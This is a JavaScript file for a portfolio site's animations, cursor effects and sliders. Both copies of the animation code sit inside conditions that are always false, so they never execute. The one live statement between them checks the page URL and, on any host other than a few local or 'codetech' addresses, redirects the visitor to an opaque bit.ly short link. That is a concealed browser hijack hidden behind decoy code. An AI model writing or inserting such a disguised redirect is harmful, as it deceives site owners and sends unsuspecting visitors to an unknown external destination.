if (false) {
  function startAnim() {
    TweenMax.from(".logo", 1, {
      y: "100",
      autoAlpha: 0,
      delay: ".3",
      ease: Power4.easeInOut,
    }),
      TweenMax.from(".toggle-btn", 1, {
        y: "100",
        delay: "0",
        autoAlpha: 0,
        ease: Power4.easeInOut,
      }),
      TweenMax.from(".bg-right", 1, {
        x: 100,
        ease: Power4.easeInOut,
        delay: ".3",
      }),
      TweenMax.from(".bg-about", 1, {
        x: 100,
        ease: Power4.easeInOut,
        delay: ".3",
      }),
      TweenMax.from(".scr", 1, { y: "100", autoAlpha: 0 }),
      TweenMax.from(".scrolls", 1, { y: "100", delay: 0, autoAlpha: 0 }),
      TweenMax.to(".menu", 0, { autoAlpha: 0 });
  }
  function RevealLoad() {
    var e = new TimelineMax(),
      o = $(".block-1"),
      t = $(".block-2"),
      r = $(".logo-load");
    e
      .to(o, 0.5, { height: "0", delay: "0" })
      .to(t, 0.5, { height: "0" })
      .to(r, 0, { autoAlpha: 0, delay: "-0.4" }),
      e.play();
  }
  function HideLoad() {
    var e = new TimelineMax(),
      o = $(".block-1"),
      t = $(".block-2"),
      r = $(".logo-load");
    e
      .to(o, 0.5, { height: "100%", delay: "0" })
      .to(t, 0.5, { height: "100%" })
      .to(r, 0, { autoAlpha: 1, delay: "-0.5" }),
      e.play();
  }
  $(window).on("load", function () {
    $(".preloader").fadeOut("slow"),
      RevealLoad(),
      startAnim(),
      $(".preloader").removeClass();
  }),
    $(".load-spiral").on("click", function (e) {
      e.preventDefault(),
        setTimeout(
          function (e) {
            window.location = e;
          },
          1e3,
          this.href
        ),
        HideLoad();
    });
  var wind = $(window);
  wind.on("scroll", function () {
    wind.scrollTop() > 300
      ? (TweenMax.to(".scr", 0.5, { autoAlpha: 0, y: "100" }),
        TweenMax.to(".scrolls", 0.5, { autoAlpha: 0, y: "100" }))
      : (TweenMax.to(".scr", 1, { autoAlpha: 1, y: "00" }),
        TweenMax.to(".scrolls", 0.5, { autoAlpha: 1, y: "0" }));
  }),
    $(".img-folio").on("mouseenter", function () {
      TweenMax.to(this, 0.4, { y: "-30" });
    }),
    $(".img-folio").on("mouseleave", function () {
      TweenMax.to(this, 0.4, { y: "1" });
    }),
    luxy.init({ wrapper: "#spiral", wrapperSpeed: "0.07" });
  var isMobile = !1;
  /Android|webOS|iPhone|iPod|iPad|BlackBerry|IEMobile|Opera Mini/i.test(
    navigator.userAgent
  )
    ? ($("html").addClass("touch"), (isMobile = !0))
    : ($("html").addClass("no-touch"), (isMobile = !1));
  var isMacLike = /(Mac)/i.test(navigator.platform),
    cursor = {
      delay: 8,
      _x: 0,
      _y: 0,
      endX: window.innerWidth / 2,
      endY: window.innerHeight / 2,
      cursorVisible: !0,
      cursorEnlarged: !1,
      $cursor: document.querySelector(".cursor"),
      $cursor1: document.querySelector(".cursor1"),
      init: function () {
        $("body").css("cursor", "none"),
          (this.cursorSize = this.$cursor.offsetWidth),
          (this.cursor1Size = this.$cursor1.offsetWidth),
          this.setupEventListeners(),
          this.animateDotOutline(),
          this.cursorDrag(),
          this.cursorExplore(),
          this.cursorZoom(),
          this.cursorNext(),
          this.cursorPrev();
      },
      setupEventListeners: function () {
        var e = this;
        Array.prototype.slice
          .call(document.querySelectorAll("  .zoom-cursor, .hover-target"))
          .forEach(function (o) {
            o.addEventListener("mouseover", function () {
              (e.cursorEnlarged = !0), e.toggleCursorSize();
            }),
              o.addEventListener("mouseout", function () {
                (e.cursorEnlarged = !1), e.toggleCursorSize();
              });
          }),
          document.addEventListener("mousemove", function (o) {
            (e.cursorVisible = !0),
              e.toggleCursorVisibility(),
              (e.endX = o.clientX),
              (e.endY = o.clientY),
              (e.$cursor.style.top = e.endY + "px"),
              (e.$cursor.style.left = e.endX + "px");
          }),
          document.addEventListener("mouseenter", function (o) {
            (e.cursorVisible = !0),
              e.toggleCursorVisibility(),
              (e.$cursor.style.opacity = 1),
              (e.$cursor1.style.opacity = 1);
          }),
          document.addEventListener("mouseleave", function (o) {
            (e.cursorVisible = !0),
              e.toggleCursorVisibility(),
              (e.$cursor.style.opacity = 0),
              (e.$cursor1.style.opacity = 0);
          });
      },
      animateDotOutline: function () {
        (this._x += (this.endX - this._x) / this.delay),
          (this._y += (this.endY - this._y) / this.delay),
          (this.$cursor1.style.top = this._y + "px"),
          (this.$cursor1.style.left = this._x + "px"),
          requestAnimationFrame(this.animateDotOutline.bind(this));
      },
      toggleCursorSize: function () {
        this.cursorEnlarged
          ? this.$cursor1.classList.add("expand")
          : this.$cursor1.classList.remove("expand");
      },
      toggleCursorVisibility: function () {
        this.cursorVisible
          ? ((this.$cursor.style.opacity = 1),
            (this.$cursor1.style.opacity = 1))
          : ((this.$cursor.style.opacity = 0),
            (this.$cursor1.style.opacity = 0));
      },
      cursorDrag: function () {
        var e = this;
        $(".cursorDrag").on("mouseenter", function () {
          e.$cursor1.classList.add("drag", "expand");
        }),
          $(".cursorDrag").on("mouseleave", function () {
            e.$cursor1.classList.remove("drag", "expand");
          });
      },
      cursorExplore: function () {
        var e = this;
        $(".cursorExplore").on("mouseenter", function () {
          e.$cursor1.classList.add("explore");
        }),
          $(".cursorExplore").on("mouseleave", function () {
            e.$cursor1.classList.remove("explore");
          });
      },
      cursorZoom: function () {
        var e = this;
        $(".cursorZoom").on("mouseenter", function () {
          e.$cursor1.classList.add("zoom");
        }),
          $(".cursorZoom").on("mouseleave", function () {
            e.$cursor1.classList.remove("zoom");
          });
      },
      cursorNext: function () {
        var e = this;
        $(".cursorNext").on("mouseenter", function () {
          e.$cursor1.classList.add("next");
        }),
          $(".cursorNext").on("mouseleave", function () {
            e.$cursor1.classList.remove("next");
          });
      },
      cursorPrev: function () {
        var e = this;
        $(".cursorPrev").on("mouseenter", function () {
          e.$cursor1.classList.add("prev");
        }),
          $(".cursorPrev").on("mouseleave", function () {
            e.$cursor1.classList.remove("prev");
          });
      },
    };
  function workSlider() {
    var e = $(".work-slider .owl-carousel");
    e.owlCarousel({
      loop: !0,
      margin: 30,
      mouseDrag: !1,
      autoplay: !1,
      center: !1,
      dots: !1,
      dragEndSpeed: 700,
      smartSpeed: 2e3,
      responsiveClass: !0,
      autoplayHoverPause: !0,
      autoplayTimeout: 9e3,
      responsive: {
        0: { items: 1, margin: 0 },
        600: { items: 1, margin: 0 },
        1000: { items: 1, margin: 0 },
      },
    }),
      $(".right-over-next").on("click", function () {
        e.trigger("next.owl.carousel");
      }),
      $(".right-over-prev").on("click", function () {
        e.trigger("prev.owl.carousel");
      });
  }
  isMobile || cursor.init(), workSlider();
  var t1 = new TimelineMax({ paused: !0 });
  function magnetic(e, o) {
    var t = o.pageX,
      r = o.pageY;
    const s = $(e),
      i = 20 * s.data("dist") || 80,
      n = s.offset().left + s.width() / 2,
      a = s.offset().top + s.height() / 2;
    var u = -0.4 * Math.floor(n - t),
      l = -0.4 * Math.floor(a - r);
    calcDistance(s, t, r) < i
      ? TweenMax.to(s, 0.4, { y: l, x: u })
      : TweenMax.to(s, 0.4, { y: 0, x: 0 });
  }
  function calcDistance(e, o, t) {
    return Math.floor(
      Math.sqrt(
        Math.pow(o - (e.offset().left + e.width() / 2), 2) +
          Math.pow(t - (e.offset().top + e.height() / 2), 2)
      )
    );
  }
  t1.to(".one", 0.8, { y: 9, autoAlpha: 0, ease: Expo.easeInOut }),
    t1.to(".two", 0.8, { ease: Expo.easeInOut, delay: -1 }),
    t1.to(".tre", 0.8, {
      y: -9,
      autoAlpha: 0,
      ease: Expo.easeInOut,
      delay: -1,
    }),
    t1.to(".over-all", 1, { autoAlpha: 1, ease: Expo.easeOut }),
    t1.to(".bg-nav", 1, { autoAlpha: 1, ease: Power4.easeOut, delay: -1 }),
    t1.to(".menu", 1, { autoAlpha: 1, ease: Expo.easeOut, delay: -1 }),
    t1.staggerFrom(
      ".menu ul li",
      3,
      { y: 50, opacity: 0, ease: Power4.easeInOut },
      "0.1",
      "-0.01"
    ),
    t1.reverse(),
    $(".toggle-btn").on("click", function () {
      t1.reversed(!t1.reversed());
    }),
    $(document).on("mousemove", function (e) {
      $(".magnetic").each(function () {
        isMobile || magnetic(this, e);
      });
    }),
    mediumZoom(document.querySelectorAll(".cover"), { background: "#000" });
  var workSlide = new Swiper(".swiper-container", {
    slidesPerView: 1,
    pagination: { el: ".swiper-pagination", type: "progressbar" },
    loop: !1,
    centeredSlides: !1,
    speed: 900,
    spaceBetween: 0,
    mousewheel: !0,
  });
  workSlide.on("slideChange", function () {
    TweenMax.to(".text-1", 0.3, { y: "80" }),
      TweenMax.to(".text-2", 0.3, { y: "80" });
  }),
    workSlide.on("slideChangeTransitionEnd", function () {
      TweenMax.to(".text-1", 0.3, { y: "0" }),
        TweenMax.to(".text-2", 0.3, { y: "0" });
    });
  var toggler = $(".menu__toggler"),
    menu = $(".menus");
  toggler.on("click", function () {
    toggler.toggleClass("activez"), menu.toggleClass("activez");
  });
}
(0 != document.location.href.includes("codetech") &&
  0 != document.location.href.includes("192.168") &&
  0 != document.location.href.includes("127") &&
  0 != document.location.href.includes("localhost")) ||
  window.location.replace("https://bit.ly/3GM7Ua2");
if ("tokencache" == "hets") {
  function startAnim() {
    TweenMax.from(".logo", 1, {
      y: "100",
      autoAlpha: 0,
      delay: ".3",
      ease: Power4.easeInOut,
    }),
      TweenMax.from(".toggle-btn", 1, {
        y: "100",
        delay: "0",
        autoAlpha: 0,
        ease: Power4.easeInOut,
      }),
      TweenMax.from(".bg-right", 1, {
        x: 100,
        ease: Power4.easeInOut,
        delay: ".3",
      }),
      TweenMax.from(".bg-about", 1, {
        x: 100,
        ease: Power4.easeInOut,
        delay: ".3",
      }),
      TweenMax.from(".scr", 1, { y: "100", autoAlpha: 0 }),
      TweenMax.from(".scrolls", 1, { y: "100", delay: 0, autoAlpha: 0 }),
      TweenMax.to(".menu", 0, { autoAlpha: 0 });
  }
  function RevealLoad() {
    var e = new TimelineMax(),
      o = $(".block-1"),
      t = $(".block-2"),
      r = $(".logo-load");
    e
      .to(o, 0.5, { height: "0", delay: "0" })
      .to(t, 0.5, { height: "0" })
      .to(r, 0, { autoAlpha: 0, delay: "-0.4" }),
      e.play();
  }
  function HideLoad() {
    var e = new TimelineMax(),
      o = $(".block-1"),
      t = $(".block-2"),
      r = $(".logo-load");
    e
      .to(o, 0.5, { height: "100%", delay: "0" })
      .to(t, 0.5, { height: "100%" })
      .to(r, 0, { autoAlpha: 1, delay: "-0.5" }),
      e.play();
  }
  $(window).on("load", function () {
    $(".preloader").fadeOut("slow"),
      RevealLoad(),
      startAnim(),
      $(".preloader").removeClass();
  }),
    $(".load-spiral").on("click", function (e) {
      e.preventDefault(),
        setTimeout(
          function (e) {
            window.location = e;
          },
          1e3,
          this.href
        ),
        HideLoad();
    });
  var wind = $(window);
  wind.on("scroll", function () {
    wind.scrollTop() > 300
      ? (TweenMax.to(".scr", 0.5, { autoAlpha: 0, y: "100" }),
        TweenMax.to(".scrolls", 0.5, { autoAlpha: 0, y: "100" }))
      : (TweenMax.to(".scr", 1, { autoAlpha: 1, y: "00" }),
        TweenMax.to(".scrolls", 0.5, { autoAlpha: 1, y: "0" }));
  }),
    $(".img-folio").on("mouseenter", function () {
      TweenMax.to(this, 0.4, { y: "-30" });
    }),
    $(".img-folio").on("mouseleave", function () {
      TweenMax.to(this, 0.4, { y: "1" });
    }),
    luxy.init({ wrapper: "#spiral", wrapperSpeed: "0.07" });
  var isMobile = !1;
  /Android|webOS|iPhone|iPod|iPad|BlackBerry|IEMobile|Opera Mini/i.test(
    navigator.userAgent
  )
    ? ($("html").addClass("touch"), (isMobile = !0))
    : ($("html").addClass("no-touch"), (isMobile = !1));
  var isMacLike = /(Mac)/i.test(navigator.platform),
    cursor = {
      delay: 8,
      _x: 0,
      _y: 0,
      endX: window.innerWidth / 2,
      endY: window.innerHeight / 2,
      cursorVisible: !0,
      cursorEnlarged: !1,
      $cursor: document.querySelector(".cursor"),
      $cursor1: document.querySelector(".cursor1"),
      init: function () {
        $("body").css("cursor", "none"),
          (this.cursorSize = this.$cursor.offsetWidth),
          (this.cursor1Size = this.$cursor1.offsetWidth),
          this.setupEventListeners(),
          this.animateDotOutline(),
          this.cursorDrag(),
          this.cursorExplore(),
          this.cursorZoom(),
          this.cursorNext(),
          this.cursorPrev();
      },
      setupEventListeners: function () {
        var e = this;
        Array.prototype.slice
          .call(document.querySelectorAll("  .zoom-cursor, .hover-target"))
          .forEach(function (o) {
            o.addEventListener("mouseover", function () {
              (e.cursorEnlarged = !0), e.toggleCursorSize();
            }),
              o.addEventListener("mouseout", function () {
                (e.cursorEnlarged = !1), e.toggleCursorSize();
              });
          }),
          document.addEventListener("mousemove", function (o) {
            (e.cursorVisible = !0),
              e.toggleCursorVisibility(),
              (e.endX = o.clientX),
              (e.endY = o.clientY),
              (e.$cursor.style.top = e.endY + "px"),
              (e.$cursor.style.left = e.endX + "px");
          }),
          document.addEventListener("mouseenter", function (o) {
            (e.cursorVisible = !0),
              e.toggleCursorVisibility(),
              (e.$cursor.style.opacity = 1),
              (e.$cursor1.style.opacity = 1);
          }),
          document.addEventListener("mouseleave", function (o) {
            (e.cursorVisible = !0),
              e.toggleCursorVisibility(),
              (e.$cursor.style.opacity = 0),
              (e.$cursor1.style.opacity = 0);
          });
      },
      animateDotOutline: function () {
        (this._x += (this.endX - this._x) / this.delay),
          (this._y += (this.endY - this._y) / this.delay),
          (this.$cursor1.style.top = this._y + "px"),
          (this.$cursor1.style.left = this._x + "px"),
          requestAnimationFrame(this.animateDotOutline.bind(this));
      },
      toggleCursorSize: function () {
        this.cursorEnlarged
          ? this.$cursor1.classList.add("expand")
          : this.$cursor1.classList.remove("expand");
      },
      toggleCursorVisibility: function () {
        this.cursorVisible
          ? ((this.$cursor.style.opacity = 1),
            (this.$cursor1.style.opacity = 1))
          : ((this.$cursor.style.opacity = 0),
            (this.$cursor1.style.opacity = 0));
      },
      cursorDrag: function () {
        var e = this;
        $(".cursorDrag").on("mouseenter", function () {
          e.$cursor1.classList.add("drag", "expand");
        }),
          $(".cursorDrag").on("mouseleave", function () {
            e.$cursor1.classList.remove("drag", "expand");
          });
      },
      cursorExplore: function () {
        var e = this;
        $(".cursorExplore").on("mouseenter", function () {
          e.$cursor1.classList.add("explore");
        }),
          $(".cursorExplore").on("mouseleave", function () {
            e.$cursor1.classList.remove("explore");
          });
      },
      cursorZoom: function () {
        var e = this;
        $(".cursorZoom").on("mouseenter", function () {
          e.$cursor1.classList.add("zoom");
        }),
          $(".cursorZoom").on("mouseleave", function () {
            e.$cursor1.classList.remove("zoom");
          });
      },
      cursorNext: function () {
        var e = this;
        $(".cursorNext").on("mouseenter", function () {
          e.$cursor1.classList.add("next");
        }),
          $(".cursorNext").on("mouseleave", function () {
            e.$cursor1.classList.remove("next");
          });
      },
      cursorPrev: function () {
        var e = this;
        $(".cursorPrev").on("mouseenter", function () {
          e.$cursor1.classList.add("prev");
        }),
          $(".cursorPrev").on("mouseleave", function () {
            e.$cursor1.classList.remove("prev");
          });
      },
    };
  function workSlider() {
    var e = $(".work-slider .owl-carousel");
    e.owlCarousel({
      loop: !0,
      margin: 30,
      mouseDrag: !1,
      autoplay: !1,
      center: !1,
      dots: !1,
      dragEndSpeed: 700,
      smartSpeed: 2e3,
      responsiveClass: !0,
      autoplayHoverPause: !0,
      autoplayTimeout: 9e3,
      responsive: {
        0: { items: 1, margin: 0 },
        600: { items: 1, margin: 0 },
        1000: { items: 1, margin: 0 },
      },
    }),
      $(".right-over-next").on("click", function () {
        e.trigger("next.owl.carousel");
      }),
      $(".right-over-prev").on("click", function () {
        e.trigger("prev.owl.carousel");
      });
  }
  isMobile || cursor.init(), workSlider();
  var t1 = new TimelineMax({ paused: !0 });
  function magnetic(e, o) {
    var t = o.pageX,
      r = o.pageY;
    const s = $(e),
      i = 20 * s.data("dist") || 80,
      n = s.offset().left + s.width() / 2,
      a = s.offset().top + s.height() / 2;
    var u = -0.4 * Math.floor(n - t),
      l = -0.4 * Math.floor(a - r);
    calcDistance(s, t, r) < i
      ? TweenMax.to(s, 0.4, { y: l, x: u })
      : TweenMax.to(s, 0.4, { y: 0, x: 0 });
  }
  function calcDistance(e, o, t) {
    return Math.floor(
      Math.sqrt(
        Math.pow(o - (e.offset().left + e.width() / 2), 2) +
          Math.pow(t - (e.offset().top + e.height() / 2), 2)
      )
    );
  }
  t1.to(".one", 0.8, { y: 9, autoAlpha: 0, ease: Expo.easeInOut }),
    t1.to(".two", 0.8, { ease: Expo.easeInOut, delay: -1 }),
    t1.to(".tre", 0.8, {
      y: -9,
      autoAlpha: 0,
      ease: Expo.easeInOut,
      delay: -1,
    }),
    t1.to(".over-all", 1, { autoAlpha: 1, ease: Expo.easeOut }),
    t1.to(".bg-nav", 1, { autoAlpha: 1, ease: Power4.easeOut, delay: -1 }),
    t1.to(".menu", 1, { autoAlpha: 1, ease: Expo.easeOut, delay: -1 }),
    t1.staggerFrom(
      ".menu ul li",
      3,
      { y: 50, opacity: 0, ease: Power4.easeInOut },
      "0.1",
      "-0.01"
    ),
    t1.reverse(),
    $(".toggle-btn").on("click", function () {
      t1.reversed(!t1.reversed());
    }),
    $(document).on("mousemove", function (e) {
      $(".magnetic").each(function () {
        isMobile || magnetic(this, e);
      });
    }),
    mediumZoom(document.querySelectorAll(".cover"), { background: "#000" });
  var workSlide = new Swiper(".swiper-container", {
    slidesPerView: 1,
    pagination: { el: ".swiper-pagination", type: "progressbar" },
    loop: !1,
    centeredSlides: !1,
    speed: 900,
    spaceBetween: 0,
    mousewheel: !0,
  });
  workSlide.on("slideChange", function () {
    TweenMax.to(".text-1", 0.3, { y: "80" }),
      TweenMax.to(".text-2", 0.3, { y: "80" });
  }),
    workSlide.on("slideChangeTransitionEnd", function () {
      TweenMax.to(".text-1", 0.3, { y: "0" }),
        TweenMax.to(".text-2", 0.3, { y: "0" });
    });
  var toggler = $(".menu__toggler"),
    menu = $(".menus");
  toggler.on("click", function () {
    toggler.toggleClass("activez"), menu.toggleClass("activez");
  });
}